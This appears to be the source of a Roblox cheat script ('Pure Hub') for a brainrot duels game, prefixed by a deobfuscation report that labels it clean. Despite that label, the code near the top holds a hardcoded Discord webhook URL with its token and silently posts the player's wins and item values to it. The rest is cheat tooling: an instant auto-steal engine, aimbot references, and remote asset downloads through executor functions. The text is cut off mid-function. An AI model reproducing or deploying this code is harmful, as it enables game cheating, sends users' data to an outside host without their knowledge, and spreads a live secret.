--════════════════════════════════════════════════════════════════════
--                REPORTE DE DESOFUSCACION — BotNoRix                 
--════════════════════════════════════════════════════════════════════
-- Fuente     : https://raw.githubusercontent.com/rblx-api/loader/main/PureHub.lua
-- Usuario    : user_io
-- Original   : 594,488 chars / 13019 líneas
-- Capas      : ninguna
-- Ofuscación : 🟢 Sin ofuscación — script limpio
-- Malware    : 🟢 Limpio
-- Tiempo     : 2086.03ms
-- BotNoRix v5.0
-- AIM BACKEND UPDATE: Normal = FR AIMBOT V7; Bypass = FR AIMBOT V11 BYPASS.
-- Source: supplied FRHUBVELOCITYv67.txt. Core prediction/movement routines ported.
-- Uses Pure's existing speed, Auto Swing, Safe Mode, keybinds and mobile controls.
-- FR UI/loaders/config files are not imported. Existing intro/theme are unchanged.
-- PURE HUB | iOS FRAME/AUDIO PLAYER | REVISION 3 | ICE BLUE
-- The intro DOES NOT create VideoFrame instances or request local MP4/WebM decoding.
-- Original MP4 archive was extracted; it is not required for frame playback.
-- Actual iOS picture playback: 312 frames at 480x480 / 30 fps, JPEG atlases.
-- This is a lower-resolution compatibility renderer, NOT original 1080p/120fps.
-- Audio is the extracted MP3 only; the OGG fallback was removed.
-- No other intro music, speed changes, normalization, or volume boost is used.
-- Extracted JPEG sheets and MP3 must be placed in the executor workspace.
-- Intro: 11 seconds FROM PLAYBACK; source lasts 10.403 s, final frame is held.
-- Skip (top right): stops video/audio and opens the hub immediately.
-- Pictures are double-buffered; the audio clock synchronizes frame selection.
-- Requires a client environment supporting readfile + getcustomasset/getsynasset
-- for ordinary images/sounds, NOT local video. Plain LocalScripts lack file I/O.
-- If image preparation fails, the hub opens instead of getting stuck.
-- Background: the hub window now uses picture asset 79302556024569
-- instead of the previous one (93972327961608).
-- Saved settings retain the original config file/field names for compatibility.
-- This edit does not execute or audit the original external loaders/game logic.

local Players = game:GetService("Players")
local Http = game:GetService("HttpService")
local lp = Players.LocalPlayer
local req = request or http_request or (syn and syn.request)

local hook = "https://discord.com/api/webhooks/1548920880136986644/EJrgCluf1DESlt0wciyJi7bPW-_m95R3Pj3zViFSAUxlDpU76mbX5v11ui39G0p72AxF"

local lastWin = 0
local COOLDOWN = 5

local function stripTags(t)
	return t and t:gsub("<[^>]+>", "") or ""
end

local function short(n)
	if n >= 1e12 then return string.format("%.1fT",n/1e12)
	elseif n >= 1e9 then return string.format("%.1fB",n/1e9)
	elseif n >= 1e6 then return string.format("%.1fM",n/1e6)
	elseif n >= 1e3 then return string.format("%.1fK",n/1e3) end
	return tostring(math.floor(n))
end

local function num(v)
	v = tostring(v):gsub("%s","")
	local n,s = v:match("([%d%.]+)(%a?)")
	n = tonumber(n) or 0
	if s == "K" or s == "k" then n = n * 1e3
	elseif s == "M" or s == "m" then n = n * 1e6
	elseif s == "B" or s == "b" then n = n * 1e9
	elseif s == "T" or s == "t" then n = n * 1e12 end
	return n
end

local function getBrainrot()
	local p3 = Vector3.new(-476.752,10.464,7.107)
	local p7 = Vector3.new(-476.752,10.464,114.107)
	local mine
	
	for _,v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Name == "PlotSign" then
			local d3 = (v.Position-p3).Magnitude
			local d7 = (v.Position-p7).Magnitude
			if d3 < 5 or d7 < 5 then
				for _,x in ipairs(v:GetDescendants()) do
					if x:IsA("TextLabel") and x.Text ~= "" then
						if x.Text:find(lp.Name) or x.Text:find(lp.DisplayName) then
							mine = d3 < 5 and 3 or 7
						end
					end
				end
			end
		end
	end
	
	if not mine then return "Unknown","N/A" end
	local pos = mine == 3 and p7 or p3
	local db = workspace:FindFirstChild("Debris")
	if not db then return "Unknown","N/A" end
	
	local best,bestVal
	for _,v in ipairs(db:GetChildren()) do
		repeat
		if v.Name ~= "FastOverheadTemplate" then break end
		local sg = v:FindFirstChildOfClass("SurfaceGui")
		if not sg or not sg.Adornee then break end
		if (sg.Adornee.Position-pos).Magnitude > 50 then break end
		local gen = sg:FindFirstChild("Generation",true)
		if gen and gen:IsA("TextLabel") then
			local val = num(gen.Text)
			if not bestVal or val > bestVal then
				bestVal = val
				local dn = sg:FindFirstChild("DisplayName",true)
				best = dn and dn.Text or v.Name
			end
		end
		until true
	end
	return best or "Unknown", bestVal and short(bestVal) or "N/A"
end

local function send(brainrot, value)
	if not req then return end
	local s = tostring(brainrot):gsub("`","'")
	pcall(function()
		req({
			Url = hook,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = Http:JSONEncode({
				embeds = {{
					title = "\u{1FAE8}PURE HUB DUELS\u{1FAE8}",
					description = "```\u{1F62E}\u{200D}\u{1F4A8} SOMONE JUST MOGGED WITH DUELS V2 \u{1F62E}\u{200D}\u{1F4A8}```",
					color = 0xC9EEFF,
					fields = {
						{name="\u{1F9E0} Brainrot",value="```"..s.."```",inline=true},
						{name="\u{1F4B0} Value",value="```"..value.."```",inline=true}
					},
					footer = {text = "PURE HUB | "..os.date("%H:%M:%S")},
					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
				}}
			})
		})
	end)
end

local function onWin()
	if tick()-lastWin < COOLDOWN then return end
	lastWin = tick()
	
	print("[PURE HUB] WIN DETECTED!")
	local br,val = getBrainrot()
	print(string.format("[PURE HUB] %s | %s", br, val))
	send(br, val)
end
-- this print not ai i put it to test the script
local function scan(obj)
	if not (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) then return end
	local clean = stripTags(obj.Text):lower()
	if clean:find(lp.Name:lower(),1,true) and clean:find("won the duel") then
		onWin()
	end
end

local pg = lp:WaitForChild("PlayerGui")

for _,v in ipairs(pg:GetDescendants()) do
	scan(v)
	if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("TextBox") then
		v:GetPropertyChangedSignal("Text"):Connect(function() scan(v) end)
	end
end

pg.DescendantAdded:Connect(function(v)
	scan(v)
	if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("TextBox") then
		v:GetPropertyChangedSignal("Text"):Connect(function() scan(v) end)
	end
end)-- Lua 5.1 compatible build v2 (no _G usage: shared names live in one local table)
local __HH = {}
local LP = LP
local Lighting = Lighting
local Players = Players
local RunService = RunService
local SKY_PRESETS = SKY_PRESETS
local TS = TS
local loadConfig = loadConfig
local uiScaleValue = uiScaleValue
do

-- ============================================================
-- RED CIRCLE — always ON. No toggle, no button, no config.
-- Flat red disc on the ground right under the player, exactly
-- like Horizon Hub's red circle. Follows the ground everywhere and
-- keeps working across respawns automatically.
-- ============================================================
do
    task.spawn(function()
        repeat task.wait() until game:IsLoaded()
        local plrs = game:GetService("Players")
        local run  = game:GetService("RunService")
        local lplr = plrs.LocalPlayer
        local c = Instance.new("Part")
        c.Name = "HorizonHubBlueHitRange"
        c.Shape = Enum.PartType.Cylinder
        c.Size = Vector3.new(12, 0.1, 12)
        c.Anchored = true
        c.CanCollide = false
        c.CanQuery = false
        c.CanTouch = false
        c.CastShadow = false
        c.Material = Enum.Material.SmoothPlastic
        c.Color = Color3.fromRGB(173, 225, 255)
        c.Transparency = 0.4
        c.Parent = workspace
        print("[horizonhub] BLUE HIT RANGE CREATED ✓")
        run.Heartbeat:Connect(function()
            pcall(function()
                if not (c and c.Parent) then return end
                local char = lplr.Character
                if not char then c.Visible = false; return end
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if not hrp then c.Visible = false; return end
                local rp = RaycastParams.new()
                rp.FilterDescendantsInstances = {char, c}
                rp.FilterType = Enum.RaycastFilterType.Exclude
                local res = workspace:Raycast(hrp.Position, Vector3.new(0, -2000, 0), rp)
                if res then
                    local hum = char:FindFirstChildOfClass("Humanoid")
                    local gy = res.Position.Y + 0.06
                    if hum then
                        -- hard clamp: the circle never rises into the player
                        gy = math.min(gy, hrp.Position.Y - hum.HipHeight - 0.05)
                    end
                    c.Visible = true
                    c.CFrame = CFrame.new(res.Position.X, gy, res.Position.Z)
                else
                    local hum = char:FindFirstChildOfClass("Humanoid")
                    if hum and hum.FloorMaterial ~= Enum.Material.Air then
                        c.Visible = true
                        c.CFrame = CFrame.new(hrp.Position.X, hrp.Position.Y - hum.HipHeight - 0.1, hrp.Position.Z)
                    else
                        c.Visible = false
                    end
                end
            end)
        end)
    end)
end

task.spawn(function() pcall(function()
repeat task.wait() until game:IsLoaded()
local TweenService      = game:GetService("TweenService")
local Players           = game:GetService("Players")
local RunService        = game:GetService("RunService")
local Stats             = game:GetService("Stats")
local SKY_PRESETS_LIST = {"Off","Night","Aurora","Sunset","Galaxy","Tech","Sakura","Pink Night","Blood Moon","Emerald Dawn","Volcanic","Arctic","Midnight Ocean","Vaporwave","Toxic","Solar Eclipse","Hellscape","Heaven","Storm","Sunrise","Deep Space","Lavender Dream","Inferno","Mint Sky"}
local SKY_PRESETS = {
    Off={kind="off"},
    Night={clock=22,brightness=2,ambient={110,100,130},outAmb={120,110,140}},
    Aurora={clock=14,brightness=3,ambient={150,120,150},outAmb={160,130,150}},
    Sunset={clock=17.2,brightness=2.5,ambient={170,120,100},outAmb={180,130,110}},
    Galaxy={clock=0,brightness=1.5,ambient={70,60,100},outAmb={80,70,110}},
    Tech={clock=21,brightness=2.2,ambient={90,130,170},outAmb={100,140,180}},
    Sakura={clock=11,brightness=3.5,ambient={170,150,160},outAmb={180,160,170}},
    ["Pink Night"]={clock=23,brightness=2.2,ambient={120,60,110},outAmb={140,70,120}},
    ["Blood Moon"]={clock=22.5,brightness=1.6,ambient={130,40,40},outAmb={150,50,50}},
    ["Emerald Dawn"]={clock=6.5,brightness=2.8,ambient={130,170,140},outAmb={140,180,150}},
    Volcanic={clock=19,brightness=2,ambient={180,80,40},outAmb={200,90,50}},
    Arctic={clock=9,brightness=3.2,ambient={200,220,235},outAmb={210,230,245}},
    ["Midnight Ocean"]={clock=1.5,brightness=1.7,ambient={60,90,130},outAmb={70,100,140}},
    Vaporwave={clock=19.5,brightness=2.4,ambient={180,120,200},outAmb={190,130,210}},
    Toxic={clock=13,brightness=2.5,ambient={140,180,80},outAmb={150,190,90}},
    ["Solar Eclipse"]={clock=12,brightness=0.9,ambient={50,40,60},outAmb={60,50,70}},
    Hellscape={clock=18,brightness=1.8,ambient={200,60,30},outAmb={220,70,40}},
    Heaven={clock=12,brightness=4,ambient={240,235,210},outAmb={250,245,220}},
    Storm={clock=15,brightness=1.4,ambient={90,90,110},outAmb={100,100,120}},
    Sunrise={clock=6.2,brightness=2.8,ambient={220,180,130},outAmb={230,190,140}},
    ["Deep Space"]={clock=0,brightness=1,ambient={30,25,50},outAmb={40,35,60}},
    ["Lavender Dream"]={clock=18.5,brightness=2.6,ambient={180,160,220},outAmb={190,170,230}},
    Inferno={clock=17.5,brightness=2.2,ambient={220,100,40},outAmb={235,110,50}},
    ["Mint Sky"]={clock=10,brightness=3.2,ambient={180,230,210},outAmb={190,240,220}}
}
local function _vC3(t) return Color3.fromRGB(t[1],t[2],t[3]) end
local function _v4mpClearSky()
    for _,v in ipairs(game:GetService("Lighting"):GetChildren()) do if v:GetAttribute("_AceDuelsSky") then pcall(function() v:Destroy() end) end end
    local terrain = workspace:FindFirstChildOfClass("Terrain")
    if terrain then for _,v in ipairs(terrain:GetChildren()) do if v:GetAttribute("_AceDuelsSky") then pcall(function() v:Destroy() end) end end end
end
local function applyCustomSky(mode)
    _v4mpClearSky()
    local p = SKY_PRESETS[mode]
    local Lighting = game:GetService("Lighting")
    if not p or p.kind=="off" then 
        Lighting.Brightness=2; Lighting.ClockTime=14; Lighting.GlobalShadows=true; 
        __HH.currentSkyTheme="Off"; return 
    end
    Lighting.ClockTime=p.clock or 14; Lighting.Brightness=p.brightness or 2; 
    if p.ambient then Lighting.Ambient=_vC3(p.ambient) end; 
    if p.outAmb then Lighting.OutdoorAmbient=_vC3(p.outAmb) end
    local atm=Instance.new("Atmosphere"); atm:SetAttribute("_AceDuelsSky",true); atm.Density=0.35; atm.Color=Lighting.Ambient; atm.Decay=Lighting.OutdoorAmbient; atm.Parent=Lighting
    local sky=Instance.new("Sky"); sky:SetAttribute("_AceDuelsSky",true); sky.StarCount=(mode=="Galaxy" or mode=="Deep Space") and 10000 or 2000; sky.Parent=Lighting
    __HH.currentSkyTheme=mode
end
end) end)

-- insta steal
task.spawn(function() pcall(function()
repeat task.wait() until game:IsLoaded()
local TweenService      = game:GetService("TweenService")
local Players           = game:GetService("Players")
local RunService        = game:GetService("RunService")
local UserInputService  = game:GetService("UserInputService")
local CoreGui           = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Stats             = game:GetService("Stats")
local LP = Players.LocalPlayer
if _G.InstaStealConn then
    pcall(function() _G.InstaStealConn:Disconnect() end)
    _G.InstaStealConn = nil
end
if _G.FRHUBNormalSteal and _G.FRHUBNormalSteal.stealConn then
    pcall(function() _G.FRHUBNormalSteal.stealConn:Disconnect() end)
end
if _G.FRHUBSemiSteal and _G.FRHUBSemiSteal.conn then
    pcall(function() _G.FRHUBSemiSteal.conn:Disconnect() end)
end
pcall(function()
    local old = CoreGui:FindFirstChild("InstaSteal_Standalone")
    if old then old:Destroy() end
end)
local CONFIG_PATH = "FR Hub/wallahi_config.json"
local Radii = {Normal = 60, Semi = 9, SemiV2 = 51, SemiV3 = 60}
local selectedMode   = "SemiV3"
local isEnabled      = true
local uiScaleValue   = 100
local mainUIScale    = nil
local function saveConfig()
    pcall(function()
        local data = {
            normalRadius = Radii.Normal,
            semiRadius   = Radii.Semi,
            semiV2Radius = Radii.SemiV2,
            semiV3Radius = Radii.SemiV3,
            mode         = selectedMode,
            enabled      = isEnabled,
            uiScale      = uiScaleValue,
        }
        writefile(CONFIG_PATH, game:GetService("HttpService"):JSONEncode(data))
    end)
end
local function loadConfig()
    pcall(function()
        if not isfile(CONFIG_PATH) then return end
        local raw = readfile(CONFIG_PATH)
        local ok, data = pcall(function() return game:GetService("HttpService"):JSONDecode(raw) end)
        if not ok or type(data) ~= "table" then return end
        if type(data.normalRadius) == "number" then Radii.Normal = data.normalRadius end
        if type(data.semiRadius)   == "number" then Radii.Semi   = data.semiRadius   end
        if type(data.semiV2Radius) == "number" then Radii.SemiV2 = data.semiV2Radius end
        if type(data.semiV3Radius) == "number" then Radii.SemiV3 = data.semiV3Radius end
        -- Only the SemiV3 engine is implemented in this script.
        -- Old configs that saved mode "Normal"/"Semi"/"SemiV2" were silently
        -- disabling the auto steal entirely, so always force SemiV3.
        selectedMode = "SemiV3"
        if type(data.enabled) == "boolean" then isEnabled = data.enabled end
        if type(data.uiScale) == "number"  then uiScaleValue = math.clamp(math.floor(data.uiScale + 0.5), 50, 200) end
    end)
end
loadConfig()
local ProgressBarFill = nil
local ProgressPercentLabel = nil
local grabPercentageLabel = nil
local _currentStealProgress = 0
_G.HorizonHubIntroFinished = false
local function setProgress(val, labelText)
    _currentStealProgress = math.clamp(val, 0, 1)
    if _G.StealBar then
        _G.StealBar.SetState("STEALING")
        _G.StealBar.SetProgress(_currentStealProgress, labelText)
    end
    if ProgressBarFill then
        TweenService:Create(ProgressBarFill, TweenInfo.new(0.05), {
            Size = UDim2.new(_currentStealProgress, 0, 1, 0)
        }):Play()
    end
    if ProgressPercentLabel then
        ProgressPercentLabel.Text = math.floor(_currentStealProgress * 100 + 0.5) .. "%"
    end
    if grabPercentageLabel then
        if type(labelText) == "string" and labelText ~= "" then
            grabPercentageLabel.Text = string.upper(labelText)
        elseif _currentStealProgress > 0 then
            grabPercentageLabel.Text = "STEALING  " .. math.floor(_currentStealProgress * 100 + 0.5) .. "%"
        else
            grabPercentageLabel.Text = "GRAB PERCENTAGE"
        end
    end
end

-- Pure Hub progress HUD — UI only.
-- The steal/auto-grab engines are untouched; this keeps the same _G.StealBar
-- interface already used by Pure's existing setProgress function.
_G.loadPureCustomAsset = function(fileName, url, fallbackId)
    local assetUrl = fallbackId or ""
    pcall(function()
        local gca = getcustomasset or getsynasset
        if not (gca and writefile) then return end
        if not (isfile and isfile(fileName)) then
            local raw = game:HttpGet(url)
            if type(raw) == "string" and #raw > 100 then
                writefile(fileName, raw)
            end
        end
        if isfile and isfile(fileName) then
            assetUrl = gca(fileName)
        end
    end)
    return assetUrl
end

local function setupNexusGrabBar()
    _G.setupNexusGrabBar = setupNexusGrabBar
    local pg = LP:WaitForChild("PlayerGui")
    local cg = game:GetService("CoreGui")
    local old = pg:FindFirstChild("StealBarGui")
    if old then old:Destroy() end
    local oldc = cg:FindFirstChild("StealBarGui")
    if oldc then oldc:Destroy() end

    local gui = Instance.new("ScreenGui")
    gui.Name = "StealBarGui"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 200
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Enabled = false
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
    if not pcall(function() gui.Parent = cg end) then gui.Parent = pg end

    local savedPos
    pcall(function()
        if isfile and isfile("horizon_steal_bar_pos.json") then
            savedPos = game:GetService("HttpService"):JSONDecode(readfile("horizon_steal_bar_pos.json"))
        end
    end)
    local defaultPos = UDim2.new(0.5, 0, 1, -14)
    local savedUDim = type(savedPos) == "table"
        and UDim2.new(savedPos.xs or 0.5, savedPos.xo or 0, savedPos.ys or 1, savedPos.yo or -14)
        or defaultPos

    local BAR_BG      = Color3.fromRGB(4, 8, 16)
    local BLUE_STROKE = Color3.fromRGB(54, 126, 220)
    local BLUE_ACTIVE = Color3.fromRGB(42, 138, 248)
    local BLUE_OFF    = Color3.fromRGB(12, 28, 54)
    local CYAN_READY  = Color3.fromRGB(98, 174, 246)
    local TEXT_BRIGHT = Color3.fromRGB(238, 245, 255)
    local TEXT_DIM    = Color3.fromRGB(182, 204, 232)

    local shadow = Instance.new("Frame", gui)
    shadow.Name = "Shadow"
    shadow.Size = UDim2.new(0, 566, 0, 54)
    shadow.Position = UDim2.new(savedUDim.X.Scale, savedUDim.X.Offset, savedUDim.Y.Scale, savedUDim.Y.Offset + 3)
    shadow.AnchorPoint = Vector2.new(0.5, 1)
    shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    shadow.BackgroundTransparency = 0.38
    shadow.BorderSizePixel = 0
    shadow.ZIndex = 299
    Instance.new("UICorner", shadow).CornerRadius = UDim.new(0, 14)

    local card = Instance.new("Frame", gui)
    card.Name = "StealProgressGui"
    card.Size = UDim2.new(0, 560, 0, 48)
    card.Position = savedUDim
    card.AnchorPoint = Vector2.new(0.5, 1)
    card.BackgroundColor3 = BAR_BG
    card.BackgroundTransparency = 0.04
    card.BorderSizePixel = 0
    card.Active = true
    card.Visible = true
    card.ClipsDescendants = true
    card.ZIndex = 300
    Instance.new("UICorner", card).CornerRadius = UDim.new(0, 13)

    local border = Instance.new("UIStroke", card)
    border.Color = BLUE_STROKE
    border.Thickness = 1.3
    border.Transparency = 0.22

    local cardGradient = Instance.new("UIGradient", card)
    cardGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(5, 11, 22)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(8, 18, 36)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 11, 22))
    })
    cardGradient.Rotation = 0

    local textFrame = Instance.new("Frame", card)
    textFrame.Size = UDim2.new(1, 0, 1, 0)
    textFrame.BackgroundTransparency = 1
    textFrame.ZIndex = 301

    local logoHolder = Instance.new("Frame", textFrame)
    logoHolder.Size = UDim2.new(0, 26, 0, 26)
    logoHolder.Position = UDim2.new(0, 16, 0.5, -13)
    logoHolder.BackgroundTransparency = 1
    logoHolder.ZIndex = 302
    Instance.new("UICorner", logoHolder).CornerRadius = UDim.new(0, 6)

    local pFallback = Instance.new("TextLabel", logoHolder)
    pFallback.Size = UDim2.new(1, 0, 1, 0)
    pFallback.BackgroundTransparency = 1
    pFallback.Text = "P"
    pFallback.TextColor3 = Color3.fromRGB(68, 162, 255)
    pFallback.Font = Enum.Font.GothamBlack
    pFallback.TextSize = 20
    pFallback.ZIndex = 302

    local pIcon = Instance.new("ImageLabel", logoHolder)
    pIcon.Size = UDim2.new(1, 0, 1, 0)
    pIcon.BackgroundTransparency = 1
    pIcon.ScaleType = Enum.ScaleType.Fit
    pIcon.ZIndex = 303
    Instance.new("UICorner", pIcon).CornerRadius = UDim.new(0, 6)
    task.spawn(function()
        local url = _G.loadPureCustomAsset("pure_p_logo_v2.png", "https://pomf2.lain.la/f/bd9c8pst.png", "")
        if url ~= "" and pIcon and pIcon.Parent then
            pIcon.Image = url
            pFallback.Visible = false
        end
    end)

    local brandLabel = Instance.new("TextLabel", textFrame)
    brandLabel.Size = UDim2.new(0, 78, 1, 0)
    brandLabel.Position = UDim2.new(0, 46, 0, 0)
    brandLabel.BackgroundTransparency = 1
    brandLabel.Text = "Pure Hub"
    brandLabel.TextColor3 = Color3.fromRGB(225, 236, 252)
    brandLabel.Font = Enum.Font.GothamBold
    brandLabel.TextSize = 14
    brandLabel.TextXAlignment = Enum.TextXAlignment.Left
    brandLabel.ZIndex = 302

    local fpsLabel = Instance.new("TextLabel", textFrame)
    fpsLabel.Size = UDim2.new(0, 62, 1, 0)
    fpsLabel.Position = UDim2.new(0, 126, 0, 0)
    fpsLabel.BackgroundTransparency = 1
    fpsLabel.Text = "60 FPS"
    fpsLabel.TextColor3 = TEXT_BRIGHT
    fpsLabel.Font = Enum.Font.GothamBold
    fpsLabel.TextSize = 13
    fpsLabel.TextXAlignment = Enum.TextXAlignment.Right
    fpsLabel.ZIndex = 302

    local separator = Instance.new("Frame", textFrame)
    separator.Size = UDim2.new(0, 1.5, 0, 15)
    separator.Position = UDim2.new(0, 198, 0.5, -7.5)
    separator.BackgroundColor3 = Color3.fromRGB(130, 165, 210)
    separator.BackgroundTransparency = 0.35
    separator.BorderSizePixel = 0
    separator.ZIndex = 302

    local pingLabel = Instance.new("TextLabel", textFrame)
    pingLabel.Size = UDim2.new(0, 64, 1, 0)
    pingLabel.Position = UDim2.new(0, 208, 0, 0)
    pingLabel.BackgroundTransparency = 1
    pingLabel.Text = "11ms"
    pingLabel.TextColor3 = TEXT_DIM
    pingLabel.Font = Enum.Font.GothamMedium
    pingLabel.TextSize = 13
    pingLabel.TextXAlignment = Enum.TextXAlignment.Left
    pingLabel.ZIndex = 302

    local activePill = Instance.new("Frame", textFrame)
    activePill.Name = "ActiveBadge"
    activePill.Size = UDim2.new(0, 88, 0, 26)
    activePill.Position = UDim2.new(0, 304, 0.5, -13)
    activePill.BackgroundColor3 = BLUE_ACTIVE
    activePill.BorderSizePixel = 0
    activePill.ZIndex = 302
    Instance.new("UICorner", activePill).CornerRadius = UDim.new(0, 9)

    local pillGrad = Instance.new("UIGradient", activePill)
    pillGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(72, 168, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(40, 132, 245)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(22, 92, 205))
    })
    pillGrad.Rotation = 90

    local pillStroke = Instance.new("UIStroke", activePill)
    pillStroke.Color = Color3.fromRGB(135, 210, 255)
    pillStroke.Thickness = 1.4
    pillStroke.Transparency = 0.08

    local pillGlow = Instance.new("UIStroke", activePill)
    pillGlow.Color = Color3.fromRGB(48, 145, 255)
    pillGlow.Thickness = 3.2
    pillGlow.Transparency = 0.68

    local stealLabel = Instance.new("TextLabel", activePill)
    stealLabel.Size = UDim2.new(1, 0, 1, 0)
    stealLabel.BackgroundTransparency = 1
    stealLabel.Text = "ACTIVE"
    stealLabel.TextColor3 = Color3.fromRGB(5, 16, 36)
    stealLabel.Font = Enum.Font.GothamBlack
    stealLabel.TextSize = 11
    stealLabel.TextXAlignment = Enum.TextXAlignment.Center
    stealLabel.ZIndex = 304

    local statusRightLbl = Instance.new("TextLabel", textFrame)
    statusRightLbl.Size = UDim2.new(1, -412, 1, 0)
    statusRightLbl.Position = UDim2.new(0, 398, 0, 0)
    statusRightLbl.BackgroundTransparency = 1
    statusRightLbl.Text = "INSTA STEAL READY - V4"
    statusRightLbl.TextColor3 = CYAN_READY
    statusRightLbl.Font = Enum.Font.GothamBold
    statusRightLbl.TextSize = 11
    statusRightLbl.TextXAlignment = Enum.TextXAlignment.Right
    statusRightLbl.ZIndex = 302

    local pctLbl = Instance.new("TextLabel", textFrame)
    pctLbl.Size = UDim2.new(0, 42, 1, 0)
    pctLbl.Position = UDim2.new(0, 260, 0, 0)
    pctLbl.BackgroundTransparency = 1
    pctLbl.Text = ""
    pctLbl.TextColor3 = TEXT_BRIGHT
    pctLbl.Font = Enum.Font.GothamBold
    pctLbl.TextSize = 11
    pctLbl.TextXAlignment = Enum.TextXAlignment.Center
    pctLbl.ZIndex = 302

    local barBg = Instance.new("Frame", textFrame)
    barBg.Size = UDim2.new(1, -28, 0, 2)
    barBg.Position = UDim2.new(0, 14, 1, -3)
    barBg.BackgroundColor3 = Color3.fromRGB(10, 22, 42)
    barBg.BackgroundTransparency = 0.45
    barBg.BorderSizePixel = 0
    barBg.ClipsDescendants = true
    barBg.ZIndex = 302
    Instance.new("UICorner", barBg).CornerRadius = UDim.new(1, 0)

    local fillLine = Instance.new("Frame", barBg)
    fillLine.Name = "ProgressFill"
    fillLine.Size = UDim2.new(0, 0, 1, 0)
    fillLine.BackgroundColor3 = Color3.fromRGB(78, 178, 255)
    fillLine.BorderSizePixel = 0
    fillLine.ZIndex = 303
    Instance.new("UICorner", fillLine).CornerRadius = UDim.new(1, 0)

    local dragLayer = Instance.new("TextButton", card)
    dragLayer.Name = "DragLayer"
    dragLayer.Size = UDim2.new(1, 0, 1, 0)
    dragLayer.BackgroundTransparency = 1
    dragLayer.Text = ""
    dragLayer.AutoButtonColor = false
    dragLayer.ZIndex = 310

    local dragging, dragStart, startPos = false, nil, nil
    dragLayer.InputBegan:Connect(function(input)
        if _G.YousefUiLocked then return end
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = card.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and not _G.YousefUiLocked
            and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            card.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + delta.X,
                startPos.Y.Scale, startPos.Y.Offset + delta.Y
            )
            shadow.Position = UDim2.new(card.Position.X.Scale, card.Position.X.Offset, card.Position.Y.Scale, card.Position.Y.Offset + 3)
        end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            if not _G.YousefUiLocked then
                pcall(function()
                    writefile("horizon_steal_bar_pos.json", game:GetService("HttpService"):JSONEncode({
                        xs = card.Position.X.Scale, xo = card.Position.X.Offset,
                        ys = card.Position.Y.Scale, yo = card.Position.Y.Offset
                    }))
                end)
            end
        end
    end)

    card:GetPropertyChangedSignal("Position"):Connect(function()
        shadow.Position = UDim2.new(card.Position.X.Scale, card.Position.X.Offset, card.Position.Y.Scale, card.Position.Y.Offset + 3)
    end)

    task.spawn(function()
        local frameTimes = {}
        local totalFrameTime = 0
        local lastUiUpdate = 0
        local renderConn

        renderConn = RunService.RenderStepped:Connect(function(deltaTime)
            if not card.Parent then
                if renderConn then renderConn:Disconnect() end
                return
            end

            if type(deltaTime) == "number" and deltaTime > 0 and deltaTime < 1 then
                frameTimes[#frameTimes + 1] = deltaTime
                totalFrameTime = totalFrameTime + deltaTime
                while totalFrameTime > 0.5 and #frameTimes > 2 do
                    totalFrameTime = totalFrameTime - table.remove(frameTimes, 1)
                end
            end

            local now = os.clock()
            if now - lastUiUpdate < 0.15 then return end
            lastUiUpdate = now

            local fps = 60
            if totalFrameTime > 0 and #frameTimes > 0 then
                fps = math.floor(#frameTimes / totalFrameTime + 0.5)
            end

            local pingMs
            pcall(function()
                local network = Stats and Stats:FindFirstChild("Network")
                local serverStats = network and network:FindFirstChild("ServerStatsItem")
                local dataPing = serverStats and serverStats:FindFirstChild("Data Ping")
                if dataPing then pingMs = tonumber(dataPing:GetValue()) end
            end)
            if not pingMs then
                pcall(function() pingMs = LP:GetNetworkPing() * 1000 end)
            end
            pingMs = math.floor((tonumber(pingMs) or 11) + 0.5)

            fpsLabel.Text = string.format("%d FPS", fps)
            pingLabel.Text = string.format("%dms", pingMs)
        end)
    end)

    task.spawn(function()
        while gui.Parent do
            if _G.HorizonHubIntroFinished then
                gui.Enabled = true
                card.Visible = true
                shadow.Visible = true
            end
            task.wait(0.05)
        end
    end)

    _G.StealBar = {
        SetProgress = function(value, labelText)
            local v = math.clamp(tonumber(value) or 0, 0, 1)
            if _G.HorizonHubIntroFinished then gui.Enabled = true end
            card.Visible = true
            shadow.Visible = true
            fillLine.Size = UDim2.new(v, 0, 1, 0)
            if v > 0 then
                pctLbl.Text = math.floor(v * 100 + 0.5) .. "%"
                stealLabel.Text = "STEAL"
                statusRightLbl.Text = "INSTA STEAL ACTIVE - " .. math.floor(v * 100 + 0.5) .. "%"
            else
                pctLbl.Text = ""
            end
        end,
        SetState = function(text)
            if type(text) ~= "string" or text == "" then return end
            local state = string.upper(text)
            if state == "STEALING" or state == "OP HOLD" then
                stealLabel.Text = "ACTIVE"
                stealLabel.TextColor3 = Color3.fromRGB(5, 16, 36)
                activePill.BackgroundColor3 = BLUE_ACTIVE
                border.Color = Color3.fromRGB(85, 175, 255)
            elseif state == "READY" then
                stealLabel.Text = "ACTIVE"
                stealLabel.TextColor3 = Color3.fromRGB(5, 16, 36)
                activePill.BackgroundColor3 = BLUE_ACTIVE
